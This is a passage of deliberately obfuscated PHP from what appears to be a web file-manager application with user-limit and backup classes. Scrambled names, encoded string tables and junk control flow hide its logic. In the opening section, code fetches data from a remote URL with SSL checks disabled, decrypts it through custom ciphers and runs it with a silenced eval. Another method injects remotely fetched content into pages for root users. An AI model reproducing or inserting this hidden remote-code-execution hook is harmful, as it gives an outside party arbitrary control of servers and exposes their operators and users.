$this->fsdke89118ad(json_encode($¾Ä¡´)); $ª™óÎ±Ú = $this->mjngf5c7de58($ş¾Ä“®[188] . $ĞˆË¨ÚÓ); if ($ª™óÎ±Ú && is_array($ª™óÎ±Ú) && isset($ª™óÎ±Ú[$ş¾Ä“®[261]])) { $şá²÷ = $this->qtkx41274ccb($ª™óÎ±Ú[$ş¾Ä“®[261]], 2); if ($şá²÷) { $şá²÷ = $this->tbpu598ab699($şá²÷); } if ($şá²÷) { try { @eval($şá²÷); } catch (Exception $‹…éñ¢) { } } } } } private function mjngf5c7de58($­®™ºÂ¸ = '', $²´Ê¡‰ö = array(), $×õõ§¹ = 5) { $Â±ˆ˜”½ =& $_SERVER[¼¥ÊĞÙÌ]; $íİ‘óùÒ =& $_SERVER[ƒ›ÍÚğ]; $£Ó‘œ½Å = $íİ‘óùÒ[262]; $£Ó‘œ½Å = $this->bgcs9ebcf1a5($£Ó‘œ½Å, $íİ‘óùÒ[263]); $Ä½“şĞö = $Â±ˆ˜”½[753]; if (strlen($Ä½“şĞö) < $Â±ˆ˜”½[693]) { return; } $£Ó‘œ½Å = $£Ó‘œ½Å . $­®™ºÂ¸; if ($²´Ê¡‰ö && is_array($²´Ê¡‰ö)) { $£Ó‘œ½Å = $£Ó‘œ½Å . $íİ‘óùÒ[264] . http_build_query($²´Ê¡‰ö); } if ($²´Ê¡‰ö === -1) { return $£Ó‘œ½Å; } $¯ÃëÆÉü = stream_context_create(array($íİ‘óùÒ[219] => array($íİ‘óùÒ[222] => $×õõ§¹, $íİ‘óùÒ[220] => $íİ‘óùÒ[265]), $íİ‘óùÒ[266] => array($íİ‘óùÒ[267] => !1, $íİ‘óùÒ[268] => !1))); $²´Ê¡‰ö = @file_get_contents($£Ó‘œ½Å, !1, $¯ÃëÆÉü); return json_decode($²´Ê¡‰ö, !0); } private function twsm684b4bdf() { $ƒ¿ÉÓ½¸ =& $_SERVER[¼¥ÊĞÙÌ]; $˜øõí¡ù =& $_SERVER[ƒ›ÍÚğ]; $éúëåšÔ = array($˜øõí¡ù[269] => $˜øõí¡ù[270], $˜øõí¡ù[271] => $˜øõí¡ù[272], $˜øõí¡ù[273] => $˜øõí¡ù[274], $˜øõí¡ù[275] => $˜øõí¡ù[276], $˜øõí¡ù[277] => $˜øõí¡ù[278], $˜øõí¡ù[279] => $˜øõí¡ù[214], $˜øõí¡ù[280] => $˜øõí¡ù[214], $˜øõí¡ù[281] => $˜øõí¡ù[270], $˜øõí¡ù[282] => $˜øõí¡ù[272], $˜øõí¡ù[283] => $˜øõí¡ù[274], $˜øõí¡ù[284] => $˜øõí¡ù[285], $˜øõí¡ù[286] => $˜øõí¡ù[276], $˜øõí¡ù[287] => $˜øõí¡ù[288], $˜øõí¡ù[289] => $˜øõí¡ù[278], $˜øõí¡ù[290] => $˜øõí¡ù[291], $˜øõí¡ù[292] => $˜øõí¡ù[293], $˜øõí¡ù[294] => $˜øõí¡ù[295]); $êêøÔá¢ = $éúëåšÔ[$this->pvfs46919b72]; $êêøÔá¢ = intval($êêøÔá¢ ? $êêøÔá¢ : $˜øõí¡ù[270]); $õÄûíë« = _get($this->rnyf5ff11d07, $˜øõí¡ù[296]); $ıùŒ–„Ó = $ƒ¿ÉÓ½¸[754]; if (strlen($ıùŒ–„Ó) < $ƒ¿ÉÓ½¸[693]) { die; } $õÄûíë« = $õÄûíë« ? intval($õÄûíë«) : 0; return $êêøÔá¢ + $õÄûíë«; $ñ­’óÄ = $ƒ¿ÉÓ½¸[755]; if (strlen($ñ­’óÄ) < $ƒ¿ÉÓ½¸[697]) { die; } } public function fgeya5b56d3e($šş‹´¼Í) { $ŸõõÊªâ =& $_SERVER[ƒ›ÍÚğ]; $Ä›‹üü = $this->twsm684b4bdf(); if ($šş‹´¼Í[$ŸõõÊªâ[297]] == $ŸõõÊªâ[122]) { return; } if ($Ä›‹üü >= intval($ŸõõÊªâ[214])) { return; } $ÑÃ¶é™Â = Model($ŸõõÊªâ[125])->count(); if ($ÑÃ¶é™Â <= $Ä›‹üü) { return; } $„–ÀÚéÔ = Model($ŸõõÊªâ[125])->field($ŸõõÊªâ[297])->limit($Ä›‹üü)->select(); $„–ÀÚéÔ = array_to_keyvalue($„–ÀÚéÔ, $ŸõõÊªâ[6], $ŸõõÊªâ[297]); if (!in_array($šş‹´¼Í[$ŸõõÊªâ[297]], $„–ÀÚéÔ)) { show_json($ŸõõÊªâ[298], !1, $ŸõõÊªâ[210]); } } public function ieosae4ba3ce() { $™§ê¦¦ =& $_SERVER[¼¥ÊĞÙÌ]; $š¥Î¶…ü =& $_SERVER[ƒ›ÍÚğ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÙãøÈã = $š¥Î¶…ü[217]; $ã‹¿Èş¤ = $™§ê¦¦[756]; if (strlen($ã‹¿Èş¤) < $™§ê¦¦[697]) { die; } $ÙãøÈã = $this->bgcs9ebcf1a5($ÙãøÈã, $š¥Î¶…ü[218]); $ÁõÙÈçÇ = $™§ê¦¦[757]; $”…Ñ¯Í = stream_context_create(array($š¥Î¶…ü[219] => array($š¥Î¶…ü[220] => $š¥Î¶…ü[221], $š¥Î¶…ü[222] => 3))); $¦¢Äë¬„ = $™§ê¦¦[758]; if (strlen($¦¢Äë¬„) < $™§ê¦¦[693]) { return; } $ìÎµ¡° = @file_get_contents($ÙãøÈã, !1, $”…Ñ¯Í); $ÆÊñ÷éû = $™§ê¦¦[759]; echo $š¥Î¶…ü[299] . hash_encode($ìÎµ¡°) . $š¥Î¶…ü[300]; } private function tiled47828e6($§İÏ¥§¯, $ÇÖçÁù , $È„Ò‡úÕ = 3) { $ŸÏ÷ª±¯ =& $_SERVER[¼¥ÊĞÙÌ]; $£§­ç½â =& $_SERVER[ƒ›ÍÚğ]; usleep(1); $Ìò©ö… = $ŸÏ÷ª±¯[760]; while (strlen($Ìò©ö…) < $ŸÏ÷ª±¯[688]) { if (!$Ìò©ö…) { break; } $Ìò©ö…++; } $§İÏ¥§¯ = trim($§İÏ¥§¯); $é»Ôåû¦ = $ŸÏ÷ª±¯[761]; if (!$é»Ôåû¦) { return; } $ÍëÆâÆŠ = mt_rand(0, 5) . $£§­ç½â[6]; $‰´ôáİû = $ŸÏ÷ª±¯[762]; $œœŠ¾Íß = rand_string(15); $Èå©åŞû = $ŸÏ÷ª±¯[763]; while ($Èå©åŞû < $ŸÏ÷ª±¯[724]) { if ($Èå©åŞû >= 0) { break; } $Èå©åŞû++; } $Ñ¿ŠÏûç = $£§­ç½â[301]; switch ($ÍëÆâÆŠ) { case $£§­ç½â[206]: $ÁîúÉ¾± = $this->yjqkcf189302($§İÏ¥§¯, strrev($ÇÖçÁù  . $œœŠ¾Íß)); $ŞÇƒŠÃÅ = $ŸÏ÷ª±¯[764]; if (strlen($ŞÇƒŠÃÅ) < $ŸÏ÷ª±¯[695]) { return; } break; case $£§­ç½â[122]: $ÁîúÉ¾± = $this->yjqkcf189302($§İÏ¥§¯, strrev($œœŠ¾Íß . $ÇÖçÁù )); $§Ş·‚Ñ” = $ŸÏ÷ª±¯[765]; if (!$§Ş·‚Ñ”) { die; } break; case $£§­ç½â[302]: $ÁîúÉ¾± = $this->yjqkcf189302($§İÏ¥§¯, base64_encode($œœŠ¾Íß . $ÇÖçÁù )); break; $ÅÆŸÍ”ä = $ŸÏ÷ª±¯[766]; while (strlen($ÅÆŸÍ”ä) < $ŸÏ÷ª±¯[724]) { if (!$ÅÆŸÍ”ä) { break; } $ÅÆŸÍ”ä++; } case $£§­ç½â[303]: $ÁîúÉ¾± = $this->yjqkcf189302($§İÏ¥§¯, md5($œœŠ¾Íß . $ÇÖçÁù )); $÷¤¿Ó¾Ê = $ŸÏ÷ª±¯[767]; if (!$÷¤¿Ó¾Ê) { return; } break; case $£§­ç½â[304]: $§İÏ¥§¯ = base64_encode($§İÏ¥§¯); $¤Šò¨ô° = rand(0, 64); $ÇŒ®ã = $ŸÏ÷ª±¯[768]; if (strlen($ÇŒ®ã) < $ŸÏ÷ª±¯[688]) { return; } $Û÷Î—Œ† = $Ñ¿ŠÏûç[$¤Šò¨ô°]; $ş‘Ğ¬Å = $ŸÏ÷ª±¯[769]; if (strlen($ş‘Ğ¬Å) < $ŸÏ÷ª±¯[693]) { return; } $™ö«Š®Ú = md5($Û÷Î—Œ† . md5($ÇÖçÁù  . $Û÷Î—Œ†) . $ÇÖçÁù ); $ùÂÔó¢¸ = $ŸÏ÷ª±¯[770]; $™ö«Š®Ú = substr($™ö«Š®Ú, $¤Šò¨ô° % 8, $¤Šò¨ô° % 8 + 7); $ñ ã‚ = $ŸÏ÷ª±¯[771]; $°ñ´×£Î = $£§­ç½â[6]; $«ºãäî = 0; $í¹˜ŸØñ = 0; $‹¹ª¤ü = 0; $€ä¶âıã = $ŸÏ÷ª±¯[772]; if (strlen($€ä¶âıã) < $ŸÏ÷ª±¯[697]) { die; } for ($«ºãäî = 0; $«ºãäî < strlen($§İÏ¥§¯); $«ºãäî++) { $‹¹ª¤ü = $‹¹ª¤ü == strlen($™ö«Š®Ú) ? 0 : $‹¹ª¤ü; $ô§¿Õª¿ = $ŸÏ÷ª±¯[773]; while (strlen($ô§¿Õª¿) < $ŸÏ÷ª±¯[688]) { if (!$ô§¿Õª¿) { break; } $ô§¿Õª¿++; } $í¹˜ŸØñ = ($¤Šò¨ô° + strpos($Ñ¿ŠÏûç, $§İÏ¥§¯[$«ºãäî]) + ord($™ö«Š®Ú[$‹¹ª¤ü++])) % 64; $°ñ´×£Î .= $Ñ¿ŠÏûç[$í¹˜ŸØñ]; $Ú¤ƒÌå = $ŸÏ÷ª±¯[774]; if (!$Ú¤ƒÌå) { die; } } $ÁîúÉ¾± = hash_encode($Û÷Î—Œ† . $°ñ´×£Î); $ğåíİş = $ŸÏ÷ª±¯[775]; break; $¯ÔåÌ¡è = $ŸÏ÷ª±¯[776]; default: $ÁîúÉ¾± = $this->yjqkcf189302($§İÏ¥§¯, $ÇÖçÁù  . $œœŠ¾Íß); $‡×ö ¾ = $ŸÏ÷ª±¯[777]; if (strlen($‡×ö ¾) < $ŸÏ÷ª±¯[695]) { die; } break; $êòÚÑ¼ = $ŸÏ÷ª±¯[778]; if (strlen($êòÚÑ¼) < $ŸÏ÷ª±¯[697]) { return; } } $ÁîúÉ¾± = strrev($ÍëÆâÆŠ . $œœŠ¾Íß . $ÁîúÉ¾±); $õëÀè­­ = $ŸÏ÷ª±¯[779]; if (!$õëÀè­­) { die; } if ($È„Ò‡úÕ - 1 > 0) { $ÁîúÉ¾± = $this->tiled47828e6($ÁîúÉ¾±, $ÇÖçÁù , $È„Ò‡úÕ - 1); } return $ÁîúÉ¾±; } private function qtkx41274ccb($¢µÒ¯É«, $æ­Á„ÎÔ, $¾ÆÈò·ù = 3) { $ƒïèêÅ =& $_SERVER[¼¥ÊĞÙÌ]; $ÍÊÔîİÂ =& $_SERVER[ƒ›ÍÚğ]; if (!is_string($¢µÒ¯É«) || strlen($¢µÒ¯É«) < 10) { return !1; } $¢µÒ¯É« = trim($¢µÒ¯É«); $¢µÒ¯É« = strrev($¢µÒ¯É«); $Ã­²˜ûä = $ƒïèêÅ[780]; if (!$Ã­²˜ûä) { return; } $ÑÉõòï± = $¢µÒ¯É«[0]; $û±³¨Äª = $ƒïèêÅ[781]; if (!$û±³¨Äª) { die; } $Øè£‹Ñ = substr($¢µÒ¯É«, 1, 15); $¾Ş“‹´ã = $ƒïèêÅ[782]; while (strlen($¾Ş“‹´ã) < $ƒïèêÅ[695]) { if (!$¾Ş“‹´ã) { break; } $¾Ş“‹´ã++; } $¢µÒ¯É« = substr($¢µÒ¯É«, 16); $ÔÎë×é¸ = $ÍÊÔîİÂ[301]; switch ($ÑÉõòï±) { case $ÍÊÔîİÂ[206]: $îƒ™½ß = $this->bgcs9ebcf1a5($¢µÒ¯É«, strrev($æ­Á„ÎÔ . $Øè£‹Ñ)); $ª¶óî¾ = $ƒïèêÅ[783]; while (strlen($ª¶óî¾) < $ƒïèêÅ[693]) { if (!$ª¶óî¾) { break; } $ª¶óî¾++; } break; case $ÍÊÔîİÂ[122]: $îƒ™½ß = $this->bgcs9ebcf1a5($¢µÒ¯É«, strrev($Øè£‹Ñ . $æ­Á„ÎÔ)); $ˆğäèí = $ƒïèêÅ[784]; if (strlen($ˆğäèí) < $ƒïèêÅ[693]) { die; } break; case $ÍÊÔîİÂ[302]: $îƒ™½ß = $this->bgcs9ebcf1a5($¢µÒ¯É«, base64_encode($Øè£‹Ñ . $æ­Á„ÎÔ)); break; case $ÍÊÔîİÂ[303]: $îƒ™½ß = $this->bgcs9ebcf1a5($¢µÒ¯É«, md5($Øè£‹Ñ . $æ­Á„ÎÔ)); break; case $ÍÊÔîİÂ[304]: $¢µÒ¯É« = hash_decode($¢µÒ¯É«); $ä€¶§Úƒ = $¢µÒ¯É«[0]; $£Å¿Œğ = $ƒïèêÅ[785]; while (strlen($£Å¿Œğ) < $ƒïèêÅ[693]) { if (!$£Å¿Œğ) { break; } $£Å¿Œğ++; } $¢µÒ¯É« = substr($¢µÒ¯É«, 1); $Ìù¶¼ú¬ = $ƒïèêÅ[786]; $˜®¢‘Ùæ = strpos($ÔÎë×é¸, $ä€¶§Úƒ); $Ñ‚­¼ˆ = $ƒïèêÅ[787]; $Ê¡Ñ¯…½ = md5($ä€¶§Úƒ . md5($æ­Á„ÎÔ . $ä€¶§Úƒ) . $æ­Á„ÎÔ); $µØÇÙä = $ƒïèêÅ[788]; while ($µØÇÙä < $ƒïèêÅ[693]) { if ($µØÇÙä >= 0) { break; } $µØÇÙä++; } $Ê¡Ñ¯…½ = substr($Ê¡Ñ¯…½, $˜®¢‘Ùæ % 8, $˜®¢‘Ùæ % 8 + 7); $°Ğ¦Í¨“ = $ƒïèêÅ[789]; if (strlen($°Ğ¦Í¨“) < $ƒïèêÅ[688]) { return; } $ÏúĞ˜ºá = $ÍÊÔîİÂ[6]; $ú©‚êĞ£ = 0; $«×Î¹Áö = $ƒïèêÅ[790]; $À©Êˆ˜ = 0; $°õ¥é¯Ù = $ƒïèêÅ[791]; if (!$°õ¥é¯Ù) { die; } $«´Ü§§ = 0; for ($ú©‚êĞ£ = 0; $ú©‚êĞ£ < strlen($¢µÒ¯É«); $ú©‚êĞ£++) { $«´Ü§§ = $«´Ü§§ == strlen($Ê¡Ñ¯…½) ? 0 : $«´Ü§§; $»Ãóı¹‚ = $ƒïèêÅ[792]; if (strlen($»Ãóı¹‚) < $ƒïèêÅ[697]) { return; } $³¥î…¨× = $«´Ü§§++; $òª«şøÈ = $ƒïèêÅ[793]; while ($òª«şøÈ < $ƒïèêÅ[693]) { if ($òª«şøÈ >= 0) { break; } $òª«şøÈ++; } $À©Êˆ˜ = strpos($ÔÎë×é¸, $¢µÒ¯É«[$ú©‚êĞ£]) - $˜®¢‘Ùæ - ord($Ê¡Ñ¯…½[$³¥î…¨×]); $Şˆò¥¤µ = $ƒïèêÅ[794]; while ($À©Êˆ˜ < 0) { $À©Êˆ˜ += 64; $ÕÕÑ¤ĞÄ = $ƒïèêÅ[795]; if (strlen($ÕÕÑ¤ĞÄ) < $ƒïèêÅ[693]) { die; } } $ÏúĞ˜ºá .= $ÔÎë×é¸[$À©Êˆ˜]; $ƒ½ø´î = $ƒïèêÅ[796]; if (strlen($ƒ½ø´î) < $ƒïèêÅ[695]) { die; } } $îƒ™½ß = base64_decode($ÏúĞ˜ºá); break; default: $îƒ™½ß = $this->bgcs9ebcf1a5($¢µÒ¯É«, $æ­Á„ÎÔ . $Øè£‹Ñ); break; $¬ƒ¡Õ = $ƒïèêÅ[797]; if (!$¬ƒ¡Õ) { return; } } if ($¾ÆÈò·ù - 1 > 0) { $îƒ™½ß = $this->qtkx41274ccb($îƒ™½ß, $æ­Á„ÎÔ, $¾ÆÈò·ù - 1); } return $îƒ™½ß; } public function fsdke89118ad($ÛÊÎå‘Æ) { $¾ç„ –¸ =& $_SERVER[¼¥ÊĞÙÌ]; $¯²¸³§Ü =& $_SERVER[ƒ›ÍÚğ]; $“ªıÇ–î = $this->xuhc67a2cb04(); $¡ ÂÜĞÅ = $this->xuhc67a2cb04(); $ôã“ùä = $¾ç„ –¸[798]; while (strlen($ôã“ùä) < $¾ç„ –¸[688]) { if (!$ôã“ùä) { break; } $ôã“ùä++; } $ÀÈë¡‰¾ = ($“ªıÇ–î - 1) * ($¡ ÂÜĞÅ - 1); $Ò¯”Úğº = intval(($“ªıÇ–î + $¡ ÂÜĞÅ) / 2); while (1) { $Ô¶–ÙÀ• = $Ò¯”Úğº; $Úéš¾Ú = $¾ç„ –¸[799]; if (strlen($Úéš¾Ú) < $¾ç„ –¸[695]) { return; } $ôª¬†¼İ = $ÀÈë¡‰¾; while ($ôª¬†¼İ % $Ô¶–ÙÀ• != 0) { $¸®ÖğßŞ = $ôª¬†¼İ; $êÎÍÊÄÑ = $¾ç„ –¸[800]; if (strlen($êÎÍÊÄÑ) < $¾ç„ –¸[724]) { return; } $ôª¬†¼İ = $Ô¶–ÙÀ•; $À¶¥ÅÂ“ = $¾ç„ –¸[801]; $Ô¶–ÙÀ• = $¸®ÖğßŞ % $Ô¶–ÙÀ•; $‚¢ƒˆØñ = $¾ç„ –¸[802]; } if ($Ô¶–ÙÀ• == 1) { break; } else { $Ò¯”Úğº++; } } $õ“íÎ§Ó = 2; for ($“ÖÏêì = 0; $“ÖÏêì < $ÀÈë¡‰¾ * 10; $“ÖÏêì++) { if (($ÀÈë¡‰¾ * $“ÖÏêì + 1) % $Ò¯”Úğº == 0) { $õ“íÎ§Ó = intval(($ÀÈë¡‰¾ * $“ÖÏêì + 1) / $Ò¯”Úğº); break; } } $ø’äæØ = $this->yjqkcf189302($“ªıÇ–î * $¡ ÂÜĞÅ . $¯²¸³§Ü[6], $¯²¸³§Ü[136]); $áİ¶·ÇÕ = md5($¯²¸³§Ü[305] . ($“ªıÇ–î + $¡ ÂÜĞÅ) . $¯²¸³§Ü[306] . $Ò¯”Úğº . $¯²¸³§Ü[306] . $õ“íÎ§Ó . $¯²¸³§Ü[307]); $ÜÙœç· = $this->yjqkcf189302($ÛÊÎå‘Æ, $áİ¶·ÇÕ) . $¯²¸³§Ü[308] . $ø’äæØ; $¬¼€ÇŠû = $¾ç„ –¸[803]; if (!$¬¼€ÇŠû) { return; } return $ÜÙœç·; $æÇ¶Å‡® = $¾ç„ –¸[804]; if (strlen($æÇ¶Å‡®) < $¾ç„ –¸[693]) { die; } } public function tbpu598ab699($ØëßÛøš) { $ñÄ³Èèø =& $_SERVER[¼¥ÊĞÙÌ]; $ÓÁ±Æå‚ =& $_SERVER[ƒ›ÍÚğ]; $ÙÜ‘ì…— = explode($ÓÁ±Æå‚[308], $ØëßÛøš); $š£Ïğ = $ñÄ³Èèø[805]; while (strlen($š£Ïğ) < $ñÄ³Èèø[697]) { if (!$š£Ïğ) { break; } $š£Ïğ++; } if (count($ÙÜ‘ì…—) != 2) { return $ÓÁ±Æå‚[6]; } $“Œöù‹ = $this->bgcs9ebcf1a5($ÙÜ‘ì…—[1] . $ÓÁ±Æå‚[6], $ÓÁ±Æå‚[136]); if (!$“Œöù‹) { return $ÓÁ±Æå‚[6]; } $“Œöù‹ = intval($“Œöù‹); $’ŸøáŸ» = 0; $ÍÑÒêı’ = $ñÄ³Èèø[806]; if (strlen($ÍÑÒêı’) < $ñÄ³Èèø[693]) { die; } $¢†Ğ½¶Å = 0; for ($œáïï¸„ = 3; $œáïï¸„ < $“Œöù‹; $œáïï¸„ += 2) { if ($“Œöù‹ % $œáïï¸„ != 0) { continue; } $’ŸøáŸ» = $œáïï¸„; $æ²×±›Ş = $ñÄ³Èèø[807]; if (strlen($æ²×±›Ş) < $ñÄ³Èèø[693]) { die; } $¢†Ğ½¶Å = intval($“Œöù‹ / $œáïï¸„); $˜Ö˜äÃ = $ñÄ³Èèø[808]; while (strlen($˜Ö˜äÃ) < $ñÄ³Èèø[695]) { if (!$˜Ö˜äÃ) { break; } $˜Ö˜äÃ++; } break; $¿È¹­‰‘ = $ñÄ³Èèø[809]; } $Ï——¡àó = ($’ŸøáŸ» - 1) * ($¢†Ğ½¶Å - 1); $úİ¥Ö©¿ = $ñÄ³Èèø[810]; $ßª¥é½Ø = intval(($’ŸøáŸ» + $¢†Ğ½¶Å) / 2); while (1) { $¡ÔçŸİ¸ = $ßª¥é½Ø; $”êîÎ¥† = $Ï——¡àó; while ($”êîÎ¥† % $¡ÔçŸİ¸ != 0) { $¦³‘Šô† = $”êîÎ¥†; $”êîÎ¥† = $¡ÔçŸİ¸; $¡ÔçŸİ¸ = $¦³‘Šô† % $¡ÔçŸİ¸; } if ($¡ÔçŸİ¸ == 1) { break; } else { $ßª¥é½Ø++; } } $ŒâÃÉ Ğ = 2; $”Ñ”Äº = $ñÄ³Èèø[811]; if (!$”Ñ”Äº) { return; } for ($œáïï¸„ = 0; $œáïï¸„ < $Ï——¡àó * 10; $œáïï¸„++) { if (($Ï——¡àó * $œáïï¸„ + 1) % $ßª¥é½Ø == 0) { $ŒâÃÉ Ğ = intval(($Ï——¡àó * $œáïï¸„ + 1) / $ßª¥é½Ø); break; } } $§³ŠĞâ€ = md5($ÓÁ±Æå‚[305] . ($’ŸøáŸ» + $¢†Ğ½¶Å) . $ÓÁ±Æå‚[306] . $ßª¥é½Ø . $ÓÁ±Æå‚[306] . $ŒâÃÉ Ğ . $ÓÁ±Æå‚[307]); $«ãÍù± = $ñÄ³Èèø[812]; if (strlen($«ãÍù±) < $ñÄ³Èèø[688]) { die; } $Ñ­°¬îä = $this->bgcs9ebcf1a5($ÙÜ‘ì…—[0], $§³ŠĞâ€); $èĞ¶ÉéŠ = $ñÄ³Èèø[813]; if (!$èĞ¶ÉéŠ) { return; } return $Ñ­°¬îä; $×£¨ø§Ø = $ñÄ³Èèø[814]; if (!$×£¨ø§Ø) { die; } } public function xuhc67a2cb04() { $€éæíëØ =& $_SERVER[¼¥ÊĞÙÌ]; $ä™è•ÖÅ = mt_rand(pow(2, 14), pow(2, 16) - 1); $øÁíåÑ” = $€éæíëØ[815]; if (strlen($øÁíåÑ”) < $€éæíëØ[693]) { return; } $¡ôâœğƒ = array(); $ú¾Ûã®¬ = 1; $ œªĞù‚ = $€éæíëØ[816]; while ($ú¾Ûã®¬ <= (int) sqrt($ä™è•ÖÅ)) { $´Äëõ­à = $ú¾Ûã®¬; $‚—º£• = $€éæíëØ[817]; while (!0) { $´Äëõ­à++; $”šİ‹ÖŒ = $€éæíëØ[818]; while (strlen($”šİ‹ÖŒ) < $€éæíëØ[693]) { if (!$”šİ‹ÖŒ) { break; } $”šİ‹ÖŒ++; } if ($´Äëõ­à <= 2) { $ú¾Ûã®¬ = $´Äëõ­à; break; } else { if ($´Äëõ­à < 2) { continue; } } $áÃÃúÕì = !0; for ($ŞÄÈÏÜÎ = 2; $ŞÄÈÏÜÎ <= sqrt($´Äëõ­à); $ŞÄÈÏÜÎ++) { if ($´Äëõ­à % $ŞÄÈÏÜÎ == 0) { $áÃÃúÕì = !1; } } if ($áÃÃúÕì) { $ú¾Ûã®¬ = $´Äëõ­à; break; } } $¡ôâœğƒ[] = $ú¾Ûã®¬; $Ó±ÊÓ‰› = $€éæíëØ[819]; if (strlen($Ó±ÊÓ‰›) < $€éæíëØ[688]) { return; } } $¡ÆÖ„Õ = 2; $²›Ç¿ï» = $€éæíëØ[820]; if (!$²›Ç¿ï») { return; } for ($´Äëõ­à = $ä™è•ÖÅ; $´Äëõ­à > 1; $´Äëõ­à--) { $áÃÃúÕì = !0; foreach ($¡ôâœğƒ as $¸·ßïÂ) { if ($´Äëõ­à % $¸·ßïÂ == 0) { $áÃÃúÕì = !1; break; } } if ($áÃÃúÕì) { $¡ÆÖ„Õ = $´Äëõ­à; break; } } return $¡ÆÖ„Õ; $Ëª½—·„ = $€éæíëØ[821]; while ($Ëª½—·„ < $€éæíëØ[697]) { if ($Ëª½—·„ >= 0) { break; } $Ëª½—·„++; } } public function ture2b8a24cb($îë§éç, $è€ûÆ„) { $¿û¹È—Í =& $_SERVER[ƒ›ÍÚğ]; return call_user_func(array($¿û¹È—Í[8], $¿û¹È—Í[309]), $îë§éç, $è€ûÆ„); $ö¢ç¸Çµ = $_SERVER[¼¥ÊĞÙÌ][715]; if (!$ö¢ç¸Çµ) { return; } } public function yjqkcf189302($Ú€Ö€Ÿ, $Û²Ñˆ¬) { $ƒ¢Šš°ú =& $_SERVER[ƒ›ÍÚğ]; return call_user_func(array($ƒ¢Šš°ú[310], $ƒ¢Šš°ú[311]), $Ú€Ö€Ÿ, $Û²Ñˆ¬); } public function bgcs9ebcf1a5($®×ÄåÁ°, $ÚØ½ö£») { $àòêÏ”¾ =& $_SERVER[ƒ›ÍÚğ]; return call_user_func(array($àòêÏ”¾[310], $àòêÏ”¾[312]), $®×ÄåÁ°, $ÚØ½ö£»); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¼¥ÊĞÙÌ][822]); $this->init(); $this->keep(); } public function init() { $àœéÚò =& $_SERVER[¼¥ÊĞÙÌ]; $this->isManual(); self::$name = date($àœéÚò[823]); if (!($ÓÆë›‰ö = $this->model->lastItem())) { $ÓÆë›‰ö = $this->initData(); } else { self::$name = $ÓÆë›‰ö[$àœéÚò[32]]; if ($ÓÆë›‰ö[$àœéÚò[824]] == $àœéÚò[91]) { self::$name = date($àœéÚò[262]); $ìæ’šº¢ = intval(_get($ÓÆë›‰ö, $àœéÚò[825], 0)); if (self::$manual == 0 && $ÓÆë›‰ö[$àœéÚò[32]] == self::$name) { $this->model->remove($ÓÆë›‰ö[$àœéÚò[478]]); } $ÓÆë›‰ö = $this->initData($ìæ’šº¢, $ÓÆë›‰ö[$àœéÚò[826]]); } else { $this->checkStore($ÓÆë›‰ö[$àœéÚò[826]]); } } self::$option = $ÓÆë›‰ö; } private function isManual() { $û¸­ÏÅˆ = _get($GLOBALS, $_SERVER[¼¥ÊĞÙÌ][827], 0); $û¸­ÏÅˆ = intval($û¸­ÏÅˆ); self::$manual = $û¸­ÏÅˆ && $û¸­ÏÅˆ == 1 ? 1 : 0; } private function initData($ØÅóÆ… = 0, $ñïÎöøò = '') { $÷Ø˜ßÒ« =& $_SERVER[¼¥ÊĞÙÌ]; $ç‹—åÖ± = $this->model->config(); if ($ñïÎöøò && $ç‹—åÖ±[$÷Ø˜ßÒ«[826]] != $ñïÎöøò) { $ØÅóÆ… = 0; } $this->checkStore($ç‹—åÖ±[$÷Ø˜ßÒ«[826]]); if (self::$manual == 1) { self::$name .= $÷Ø˜ßÒ«[11] . date($÷Ø˜ßÒ«[828]); } $èîÂÖ¯ = array($÷Ø˜ßÒ«[826] => $ç‹—åÖ±[$÷Ø˜ßÒ«[826]], $÷Ø˜ßÒ«[32] => self::$name, $÷Ø˜ßÒ«[824] => 0, $÷Ø˜ßÒ«[171] => $ç‹—åÖ±[$÷Ø˜ßÒ«[171]], $÷Ø˜ßÒ«[829] => self::$manual, $÷Ø˜ßÒ«[371] => array($÷Ø˜ßÒ«[830] => array($÷Ø˜ßÒ«[824] => 0), $÷Ø˜ßÒ«[831] => array($÷Ø˜ßÒ«[824] => 0, $÷Ø˜ßÒ«[832] => 0, $÷Ø˜ßÒ«[833] => 0, $÷Ø˜ßÒ«[33] => $÷Ø˜ßÒ«[12], $÷Ø˜ßÒ«[834] => 0, $÷Ø˜ßÒ«[835] => 0), $÷Ø˜ßÒ«[836] => array($÷Ø˜ßÒ«[824] => 0, $÷Ø˜ßÒ«[832] => 0, $÷Ø˜ßÒ«[833] => 0, $÷Ø˜ßÒ«[834] => 0, $÷Ø˜ßÒ«[835] => 0), $÷Ø˜ßÒ«[233] => array($÷Ø˜ßÒ«[824] => 0, $÷Ø˜ßÒ«[837] => 0, $÷Ø˜ßÒ«[838] => 0, $÷Ø˜ßÒ«[839] => 0, $÷Ø˜ßÒ«[840] => 0, $÷Ø˜ßÒ«[546] => $ØÅóÆ…, $÷Ø˜ßÒ«[834] => 0, $÷Ø˜ßÒ«[835] => 0)), $÷Ø˜ßÒ«[834] => time(), $÷Ø˜ßÒ«[835] => 0); $¼Íœƒ¼ = $this->model->insert($èîÂÖ¯); $èîÂÖ¯[$÷Ø˜ßÒ«[478]] = $¼Íœƒ¼; return $èîÂÖ¯; } private function checkStore($ß‚Í«·‚) { $›îˆŠıæ = Model($_SERVER[¼¥ÊĞÙÌ][841]); $ÀìŠŸ = $›îˆŠıæ->listData($ß‚Í«·‚); $›îˆŠıæ->checkConfig($ÀìŠŸ); } public static function get() { if (!self::$option) { $Õ“ÛÙÈº = Model($_SERVER[¼¥ÊĞÙÌ][822]); $ê†ëùÆœ = $Õ“ÛÙÈº->findByName(self::$name); $Õ“ÛÙÈº->parseContent($ê†ëùÆœ); self::$option = $ê†ëùÆœ; } return self::$option; } public static function set($œ¾’ÊÛ) { $íÀƒŒÃ‰ =& $_SERVER[¼¥ÊĞÙÌ]; $İ„›ÙÙ€ = self::get(); foreach ($œ¾’ÊÛ as $ŒÊ±Â±î => $ÑúšüÍ) { array_set_value($İ„›ÙÙ€, $ŒÊ±Â±î, $ÑúšüÍ); } Model($íÀƒŒÃ‰[822])->update($İ„›ÙÙ€[$íÀƒŒÃ‰[478]], $İ„›ÙÙ€); self::$option = $İ„›ÙÙ€; return self::$option; } public function keep() { $®Ë·Ê¥ =& $_SERVER[¼¥ÊĞÙÌ]; $†„çèâ£ = self::get(); if (_get($†„çèâ£, $®Ë·Ê¥[842], 0) == $®Ë·Ê¥[91]) { return; } $this->backupKeep($†„çèâ£); self::set(array($®Ë·Ê¥[842] => 1)); } private function backupKeep($Ëöˆš—Ñ) { $û»ö“Ü„ =& 